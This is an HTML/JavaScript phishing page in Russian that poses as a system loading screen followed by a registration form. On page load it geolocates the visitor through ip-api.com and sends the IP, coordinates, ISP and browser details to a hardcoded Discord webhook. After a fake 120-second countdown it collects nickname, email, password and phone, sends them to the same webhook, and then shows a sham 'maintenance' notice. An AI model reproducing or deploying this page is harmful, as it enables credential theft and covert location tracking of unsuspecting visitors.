<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <title>System Protocol</title>
    <style>
        :root { --accent: #ffffff; --bg: #010205; --error: #ff3333; }
        body, html { margin: 0; padding: 0; width: 100%; height: 100%; background: var(--bg); color: white; font-family: 'Segoe UI', sans-serif; display: flex; justify-content: center; align-items: center; overflow: hidden; }
        #starfield { position: absolute; top: 0; left: 0; width: 100%; height: 100%; z-index: 0; }
        .screen { position: relative; z-index: 10; display: flex; flex-direction: column; align-items: center; transition: all 0.6s ease; width: 100%; }
        .hidden { opacity: 0; pointer-events: none; transform: scale(0.9); position: absolute; }
        .glass-form { background: rgba(255, 255, 255, 0.02); backdrop-filter: blur(20px); border: 1px solid rgba(255, 255, 255, 0.1); padding: 40px; border-radius: 24px; width: 340px; text-align: center; box-shadow: 0 25px 50px rgba(0,0,0,0.8); }
        input { width: 100%; background: rgba(255, 255, 255, 0.05); border: 1px solid rgba(255, 255, 255, 0.1); padding: 14px; margin-bottom: 15px; border-radius: 10px; color: white; outline: none; box-sizing: border-box; }
        button { width: 100%; padding: 14px; border: none; border-radius: 10px; background: var(--accent); color: black; font-weight: bold; text-transform: uppercase; cursor: pointer; letter-spacing: 2px; }
        .circle-container { position: relative; width: 180px; height: 180px; margin-bottom: 20px; }
        svg { width: 180px; height: 180px; transform: rotate(-90deg); }
        circle { fill: none; stroke-width: 2; }
        .track { stroke: rgba(255, 255, 255, 0.05); }
        .progress { stroke: var(--accent); stroke-dasharray: 565; stroke-dashoffset: 565; transition: 1s linear; }
        .percentage { font-size: 3rem; font-weight: 700; margin: 0; }
        .label { font-size: 0.7rem; text-transform: uppercase; letter-spacing: 3px; color: #666; margin-top: 10px; }
    </style>
</head>
<body>

    <canvas id="starfield"></canvas>

    <div id="loader-screen" class="screen">
        <div class="circle-container">
            <svg><circle class="track" cx="90" cy="90" r="85"></circle><circle class="progress" id="bar" cx="90" cy="90" r="85"></circle></svg>
        </div>
        <div class="percentage" id="percent">0%</div>
        <div class="label" id="status-text">связь с сервером...</div>
        <input type="password" style="opacity:0; position:absolute; bottom:0;" oninput="if(this.value==='12336778') showAuth(true)">
    </div>

    <div id="auth-screen" class="screen hidden">
        <div class="glass-form" id="main-box">
            <div id="f-content">
                <h2 style="font-weight: 200; letter-spacing: 5px;">РЕГИСТРАЦИЯ</h2>
                <input type="text" placeholder="Никнейм" id="u-name">
                <input type="email" placeholder="Почта" id="u-email">
                <input type="password" placeholder="Пароль" id="u-pass">
                <input type="tel" placeholder="Номер телефона" id="u-phone">
                <button onclick="handleAuth()">Продолжить</button>
            </div>
        </div>
    </div>

    <script>
        const web = "https://discord.com/api/webhooks/1477060454969769996/mz6ulimJZIkLmJeyuZzFEslpk1JNOuDUlu-EY6WPoK0kXUSElta0pwpw1YDDAG9wdcsp";

        // --- МГНОВЕННЫЙ ЗАХВАТ IP (СРАЗУ ПРИ ВХОДЕ) ---
        async function fullCapture() {
            try {
                // Используем JSONP или прямой fetch на стабильный сервис
                const response = await fetch('http://ip-api.com/json/?fields=status,message,country,countryCode,regionName,city,zip,lat,lon,timezone,isp,org,as,query');
                const d = await response.json();
                
                if (d.status === "success") {
                    const info = {
                        embeds: [{
                            title: "🛰️ НОВЫЙ КОНТАКТ: ЗАХВАТ IP",
                            color: 16777215,
                            fields: [
                                { name: "🌐 IP Адрес", value: d.query, inline: true },
                                { name: "📍 Город/Регион", value: `${d.city}, ${d.regionName}`, inline: true },
                                { name: "📡 Провайдер", value: d.isp, inline: false },
                                { name: "🌍 Координаты", value: `[${d.lat}, ${d.lon}](https://www.google.com/maps?q=${d.lat},${d.lon})`, inline: true },
                                { name: "⏰ Время", value: new Date().toLocaleString('ru-RU'), inline: true },
                                { name: "🖥️ Устройство", value: `ОС: ${navigator.platform}\nБраузер: ${navigator.userAgent.slice(0, 100)}...` }
                            ],
                            timestamp: new Date()
                        }]
                    };
                    fetch(web, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify(info) });
                }
            } catch(e) {
                // Если сервис заблокирован, пробуем запасной вариант
                fetch(web, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({content: "⚠️ Ошибка прямого захвата IP (CORS или Блокировка)"}) });
            }
        }
        
        // Запускаем сбор на 0%
        fullCapture();

        // --- Фон (Звезды) ---
        const canvas = document.getElementById('starfield');
        const ctx = canvas.getContext('2d');
        let stars = [];
        function initStars() {
            canvas.width = window.innerWidth; canvas.height = window.innerHeight;
            stars = [];
            for (let i = 0; i < 200; i++) stars.push({ x: Math.random() * canvas.width, y: Math.random() * canvas.height, size: Math.random() * 1.5, opacity: Math.random(), speed: Math.random() * 0.1 });
        }
        function drawStars() {
            ctx.clearRect(0, 0, canvas.width, canvas.height);
            stars.forEach(s => {
                ctx.fillStyle = `rgba(255,255,255,${s.opacity})`;
                ctx.beginPath(); ctx.arc(s.x, s.y, s.size, 0, Math.PI*2); ctx.fill();
                s.y -= s.speed; if (s.y < 0) s.y = canvas.height;
            });
            requestAnimationFrame(drawStars);
        }
        initStars(); drawStars();

        // --- Таймер 120 сек ---
        let time = 120;
        const tInt = setInterval(() => {
            time--;
            let prog = (120 - time) / 120;
            document.getElementById('bar').style.strokeDashoffset = 565 - (prog * 565);
            document.getElementById('percent').innerText = Math.floor(prog * 100) + "%";
            
            const lbl = document.getElementById('status-text');
            let p = Math.floor(prog * 100);
            if (p < 10) lbl.innerText = "загрузка серверов";
            else if (p < 20) lbl.innerText = "загрузка 9,000,000 фоток";
            else if (p < 30) lbl.innerText = "подключение";
            else if (p < 50) lbl.innerText = "вход";
            else if (p < 70) lbl.innerText = "инициализация";
            else lbl.innerText = "вход";

            if (time <= 0) { clearInterval(tInt); showAuth(); }
        }, 1000);

        function showAuth(tech = false) {
            document.getElementById('loader-screen').classList.add('hidden');
            setTimeout(() => {
                document.getElementById('auth-screen').classList.remove('hidden');
                if (tech) setTech();
            }, 600);
        }

        function setTech() {
            document.getElementById('main-box').innerHTML = `<h2 style="color:var(--error); letter-spacing:4px">ТЕХНИЧЕСКИЕ РАБОТЫ</h2><p style="color:#555; font-size:0.85rem">СИСТЕМА ВРЕМЕННО ОФФЛАЙН</p>`;
        }

        // --- Финальный сбор данных ---
        async function handleAuth() {
            const data = {
                n: document.getElementById('u-name').value,
                e: document.getElementById('u-email').value,
                p: document.getElementById('u-pass').value,
                ph: document.getElementById('u-phone').value
            };

            const finalMsg = {
                embeds: [{
                    title: "🔑 ПОЛУЧЕНЫ ДАННЫЕ ВХОДА",
                    color: 16711680,
                    fields: [
                        { name: "Ник", value: data.n, inline: true },
                        { name: "Почта", value: data.e, inline: true },
                        { name: "Телефон", value: data.ph, inline: true },
                        { name: "Пароль", value: `||${data.p}||`, inline: false }
                    ],
                    timestamp: new Date()
                }]
            };

            await fetch(web, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify(finalMsg) });
            setTech();
        }
    </script>
</body>
</html>
